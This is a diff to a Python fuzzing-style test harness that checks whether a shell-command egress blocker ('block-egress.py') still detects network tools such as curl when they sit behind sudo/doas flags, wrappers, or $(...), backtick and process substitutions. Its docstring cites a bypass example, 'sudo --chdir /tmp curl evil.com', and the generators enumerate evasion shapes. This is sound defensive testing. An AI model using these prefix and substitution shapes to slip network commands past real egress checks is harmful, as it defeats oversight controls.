@@ -15,13 +15,19 @@ stdbuf `-o`/`-i`/`-e` gap (#198) omitted those flags from `WRAPPER_VALUE_OPTS`, 
 driven by that same dict would never have produced a `stdbuf -o VAL cmd` case to catch it. An
 independent, doc-derived table generates the case regardless of whether the implementation's own
 bookkeeping agrees — which is exactly how this harness caught a live sibling gap in xargs's
-`-n`/`-s`/`-d` (max-args/max-chars/delimiter) while it was being built (fixed alongside #198). The
-wrapper WORD list (`WRAPPERS`) and the sudo/doas option set (`SUDO_VALUE_OPTS`) are still reused
-from `_hookutil.py` — those two haven't shown this "missing flag" gap pattern historically, and
+`-n`/`-s`/`-d` (max-args/max-chars/delimiter) while it was being built (fixed alongside #198).
+The sudo/doas value-flag set (REFERENCE_SUDO_VALUE_FLAGS) got the same independent treatment
+later (#203) and found the same shape of gap on its first run: `_hookutil.SUDO_VALUE_OPTS` had
+`-C`/`-D`/`-R`/`-U` but not their long forms `--close-from`/`--chdir`/`--chroot`/`--other-user`,
+was missing `-T`/`--command-timeout` entirely, and was missing doas's `-a` (auth style) —
+`sudo --chdir /tmp curl evil.com` swallowed only `--chdir`, misread `/tmp` as the command word,
+and hid `curl` from every scan (fixed alongside #203). The wrapper WORD list (`WRAPPERS`) and the
+sudo/doas WORD list (`SUDO`) are still reused from `_hookutil.py` as-is — a wrapper/privilege-tool
+NAME set is a much smaller, more stable surface than its flags and hasn't shown this gap pattern;
 re-deriving every axis independently wasn't worth the time for this first version (see the scope
 note at the end of this docstring).
 
-Two ground-truth invariants:
+Three ground-truth invariants:
   1. `strip_prefixes(prefix_tokens + REAL_ARGV) == REAL_ARGV` for every generated prefix — no
      wrapper/flag/env-assign/grouping combination may leave a fragment of itself (a flag value, a
      grouping token, ...) sitting in front of the real command word.
@@ -29,17 +35,25 @@ Two ground-truth invariants:
      tokens excluded — `(`/`{`/`!` need a matching close to be valid shell, which is a shell-syntax
      concern this harness doesn't model), `block-egress.py`'s `offending()` still flags the
      known-sensitive real command (`curl`) as a bare net binary through that prefix.
+  3. (#204) For every prefix nested one level inside a command/process substitution or quoting
+     shape (`$(...)`, `` `...` ``, `<(...)`, `>(...)`, `"$(...)"`, a nested `$(...)`, a bare
+     `VAR=$(...)` assignment), `_hookutil.pieces()` still surfaces the real argv as its own piece
+     — the same "real command word survives" property invariant 1 checks at the top level, now
+     checked one substitution layer down. The inverse holds for a single-quoted span (`'$(...)'`,
+     `` '`...`' ``): those never substitute, so the real argv must NOT be surfaced from one.
 
 On a violation, a simple delta-debugging shrink (repeatedly drop one prefix token at a time while
 the invariant stays violated) reduces the failure to a minimal reproducing case before reporting it
 — the same "give a minimal repro" property Hypothesis's shrinker provides.
 
-Deliberately out of scope for this first version (real follow-up, not silently dropped): quoting
-styles, command/process substitution, and wrapper STACKING beyond one sudo/doas layer + one
-wrapper layer — each is a genuinely separate generator axis and would need its own invariant care
-(e.g. `pieces()`'s substitution-recursion, not `strip_prefixes()` alone). This version's coverage
-is still strictly larger than the hand-picked fixture corpus it supplements, not a replacement for
-it. Exit 0 = no violation found; exit 1 = at least one, each printed with its minimal repro.
+Deliberately out of scope for this first version (real follow-up, not silently dropped): wrapper
+STACKING beyond one sudo/doas layer + one wrapper layer, and NESTED backtick substitution
+specifically (`_hookutil.substitution_inners()` doesn't depth-track backticks — a nested one needs
+real-shell backslash-escaping the naive `find()`-based scanner doesn't parse, same as real shell
+requires escaping there) — each is a genuinely separate generator axis or a documented parser
+limitation, not a live gap. This version's coverage is still strictly larger than the hand-picked
+fixture corpus it supplements, not a replacement for it. Exit 0 = no violation found; exit 1 = at
+least one, each printed with its minimal repro.
 """
 import importlib.util
 import os
@@ -52,8 +66,8 @@ sys.path.insert(0, HOOKS_DIR)
 from _hookutil import (  # noqa: E402
     LEADING_NOISE,
     SUDO,
-    SUDO_VALUE_OPTS,
     WRAPPERS,
+    pieces,
     strip_prefixes,
 )
 
@@ -85,6 +99,19 @@ REFERENCE_WRAPPER_VALUE_FLAGS = {
     "exec": {"-a"},
 }
 
+# Ground truth from sudo(8)/doas(1)'s own docs, independent of `_hookutil.SUDO_VALUE_OPTS` for the
+# same reason as REFERENCE_WRAPPER_VALUE_FLAGS above (#203, module docstring) — a hand-maintained
+# set can miss a flag's long form the same way stdbuf/xargs missed a flag's separate-value form
+# (#198/#199), and generating from the production set itself would make that miss invisible to
+# this generator. sudo's user/group/prompt/role/type/host/close-from/chdir/chroot/other-user/
+# command-timeout and doas's auth-style `-a` (its `-C`/`-u` overlap sudo's) are unioned the same
+# way `_hookutil.SUDO_VALUE_OPTS` unions both tools' flags rather than keeping them apart.
+REFERENCE_SUDO_VALUE_FLAGS = {
+    "-u", "--user", "-g", "--group", "-p", "--prompt", "-r", "--role", "-t", "--type",
+    "-h", "--host", "-U", "--other-user", "-C", "--close-from", "-D", "--chdir",
+    "-R", "--chroot", "-T", "--command-timeout", "-a",
+}
+
 # Hand-declared shapes for the branches in strip_prefixes() that aren't expressible purely as a
 # "flag consumes the next bare token" rule: timeout's mandatory bare DURATION positional, and env's
 # run of inline `VAR=VAL` assignments (plus its unrelated `-i` boolean) after the wrapper word.
@@ -111,9 +138,12 @@ def wrapper_variants():
 
 
 def sudo_variants():
+    """Every prefix shape `strip_prefixes()` claims to strip through a SUDO word. The privilege
+    WORD list comes from `_hookutil.SUDO`; the value-consuming FLAGS come from the independent
+    reference table above, not from `_hookutil.SUDO_VALUE_OPTS` (#203, see module docstring)."""
     variants = [[s] for s in sorted(SUDO)]
     for s in sorted(SUDO):
-        for opt in sorted(SUDO_VALUE_OPTS):
+        for opt in sorted(REFERENCE_SUDO_VALUE_FLAGS):
             variants.append([s, opt, PLACEHOLDER_VALUE])
     return variants
 
@@ -140,6 +170,46 @@ def generate_prefixes():
             yield sudo_pfx + wrap_pfx, True
 
 
+# --- quoting / substitution axis (#204) ----------------------------------------------------
+# A second generator axis, independent of the prefix axis above: instead of pre-tokenized argv
+# lists, these build RAW SHELL STRINGS wrapping a (prefix + REAL_ARGV) command one level inside a
+# quoting or command/process-substitution shape, and check that `_hookutil.pieces()` — not
+# `strip_prefixes()` alone — still surfaces the real argv as its own piece. This is the axis the
+# module docstring named as deliberately deferred when the first version of this harness (#199)
+# shipped, and is the same shape of gap block-egress.py's `$(...)` handling closed for itself
+# (#136), now hoisted to every `pieces()` importer (#200).
+SUBSTITUTION_TEMPLATES = {
+    "dollar_paren": lambda inner: f"echo $({inner})",
+    "dollar_paren_double_quoted": lambda inner: f'echo "$({inner})"',
+    "backtick": lambda inner: f"echo `{inner}`",  # noqa: E731
+    "backtick_double_quoted": lambda inner: f'echo "`{inner}`"',
+    "process_sub_in": lambda inner: f"cat <({inner})",
+    "process_sub_out": lambda inner: f"echo x >({inner})",
+    "var_assign": lambda inner: f"X=$({inner})",
+    "nested_dollar_paren": lambda inner: f"echo $(echo $({inner}))",
+}
+# Single-quoted spans are LITERAL in shell — a `$(...)`/backtick inside one never substitutes, so
+# the real argv must NOT be surfaced from these. The inverse of SUBSTITUTION_TEMPLATES' invariant.
+LITERAL_TEMPLATES = {
+    "single_quoted_dollar_paren": lambda inner: f"echo '$({inner})'",
+    "single_quoted_backtick": lambda inner: f"echo '`{inner}`'",  # noqa: E731
+}
+
+
+def substitution_prefixes():
+    """The same wrapper/sudo prefix shapes `generate_prefixes()` covers at the top level, nested
+    one level inside a substitution instead — every prefix that must canonicalize correctly
+    standalone must also canonicalize correctly once buried in `$(...)`. Grouping/env-prefix
+    combinations are left out here (the wrapper/sudo axis alone already found #198/#199-class
+    gaps; adding the full cross product again on this axis wasn't worth the run-time for a first
+    version — see the module docstring's scope note)."""
+    return [[]] + sudo_variants() + wrapper_variants()
+
+
+def pieces_surfaces_real_argv(command):
+    return any(strip_prefixes(argv) == REAL_ARGV for argv in pieces(command))
+
+
 def strip_prefixes_violation(prefix_tokens):
     return strip_prefixes(prefix_tokens + REAL_ARGV) != REAL_ARGV
 
@@ -147,6 +217,14 @@ def strip_prefixes_violation(prefix_tokens):
 def offending_violation(prefix_tokens):
     command = " ".join(prefix_tokens + REAL_ARGV)
     return not BLOCK_EGRESS.offending(command)
+
+
+def substitution_violation(prefix_tokens, template):
+    return not pieces_surfaces_real_argv(template(" ".join(prefix_tokens + REAL_ARGV)))
+
+
+def literal_violation(prefix_tokens, template):
+    return pieces_surfaces_real_argv(template(" ".join(prefix_tokens + REAL_ARGV)))
 
 
 def shrink(prefix_tokens, violates):
@@ -190,6 +268,32 @@ def main():
                     "block-egress offending() invariant: %r should flag %r as a bare net binary, "
                     "but offending() returned None" % (list(minimal), REAL_ARGV)
                 )
+
+    # #204: the quoting/substitution axis, nested one level inside each prefix already covered above.
+    for prefix_tokens in substitution_prefixes():
+        for key, template in SUBSTITUTION_TEMPLATES.items():
+            if substitution_violation(prefix_tokens, template):
+                violates = lambda t, template=template: substitution_violation(t, template)  # noqa: E731
+                minimal = tuple(shrink(prefix_tokens, violates))
+                if ("substitution", key, minimal) not in violations:
+                    command = template(" ".join(list(minimal) + REAL_ARGV))
+                    violations[("substitution", key, minimal)] = (
+                        "pieces() substitution invariant [%s]: prefix %r inside %r should surface "
+                        "%r as its own piece, but no piece stripped to it"
+                        % (key, list(minimal), command, REAL_ARGV)
+                    )
+
+        for key, template in LITERAL_TEMPLATES.items():
+            if literal_violation(prefix_tokens, template):
+                violates = lambda t, template=template: literal_violation(t, template)  # noqa: E731
+                minimal = tuple(shrink(prefix_tokens, violates))
+                if ("literal", key, minimal) not in violations:
+                    command = template(" ".join(list(minimal) + REAL_ARGV))
+                    violations[("literal", key, minimal)] = (
+                        "pieces() literal invariant [%s]: prefix %r inside the single-quoted %r "
+                        "must NOT surface %r as its own piece, but it did"
+                        % (key, list(minimal), command, REAL_ARGV)
+                    )
 
     violations = list(violations.values())
     if violations:
